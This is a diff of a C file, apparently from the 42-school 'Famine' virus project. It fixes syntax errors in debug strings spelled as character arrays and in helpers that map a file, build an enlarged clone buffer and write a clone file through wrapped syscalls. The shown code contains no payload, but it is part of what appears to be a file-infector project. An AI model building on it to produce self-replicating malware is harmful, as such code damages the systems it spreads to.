@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/05 06:32:25 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 09:55:54 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 12:08:05 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,8 +33,8 @@ void			*safe_accessor(const size_t offset, const size_t size, \
 
 bool			free_accessor(struct safe_pointer *info)
 {
-#ifdef DEBUG	
-	char  e[] = 'm','u','m','n','m','a','p',' ','f','a','i','l','e','d','\0';
+#ifdef DEBUG
+	char e[] = {'m','u','m','n','m','a','p',' ','f','a','i','l','e','d','\0'};
 #endif
 	if (info->ptr)
 	{
@@ -50,9 +50,9 @@ bool			original_accessor(struct safe_pointer *accessor, const char *filename)
 	void		*ptr;
 	struct stat	buf;
 	int		fd = famine_open(filename, O_RDONLY);
-#ifdef DEBUG	
+#ifdef DEBUG
 	char		e1[] = {'o','p','e','n',' ','f','a','i','l','e','d','\0'};
-	char		e2[] = {'f','s','t','a','t',' ','f','a','i','l'''e','d','\0'};
+	char		e2[] = {'f','s','t','a','t',' ','f','a','i','l','e','d','\0'};
 	char		e3[] = {'c','a','n','\'','t',' ','p','a','r','s','e',' ','d','i','r','\0'};
 	char 		e4[] = {'m','m','a','p',' ','f','a','i','l','e','d','\0'};
 	char 		e5[] = {'c','l','o','s','e',' ','f','a','i','l','e','d','\0'};
@@ -64,7 +64,7 @@ bool			original_accessor(struct safe_pointer *accessor, const char *filename)
 	if (buf.st_mode & S_IFDIR)
 		{famine_close(fd); return errors(ERR_USAGE, e3);}
 	if ((ptr = famine_mmap(0, buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
-		{famine_close(fd); return errors(ERR_SYS, e4;}
+		{famine_close(fd); return errors(ERR_SYS, e4);}
 	if (famine_close(fd))
 		{return errors(ERR_SYS, e5);}
 
@@ -76,7 +76,7 @@ bool			original_accessor(struct safe_pointer *accessor, const char *filename)
 __warn_unused_result
 bool			clone_accessor(struct safe_pointer *accessor, const size_t original_filesize)
 {
-#ifdef DEBUG	
+#ifdef DEBUG
 	char	e[] = {'m','m','a','p',' ','f','a','i','l','e','d','\0'};
 #endif
 	accessor->filesize = original_filesize + MAX_EXT_SIZE;
@@ -93,7 +93,7 @@ bool			write_clone_file(const struct safe_pointer accessor, \
 				const char *filename)
 {
 	int	fd = famine_open(filename, O_CREAT | O_WRONLY | O_TRUNC, S_IRWXU);
-#ifdef DEBUG	
+#ifdef DEBUG
 	char	e1[] = {'f','a','i','l',' ','c','r','e','a','t',' ','f','i','l','e','\0'};
 	char	e2[] = {'f','a','i','l',' ','w','r','i','t',' ','t','o',' ','f','i','l','e','\0'};
 #endif
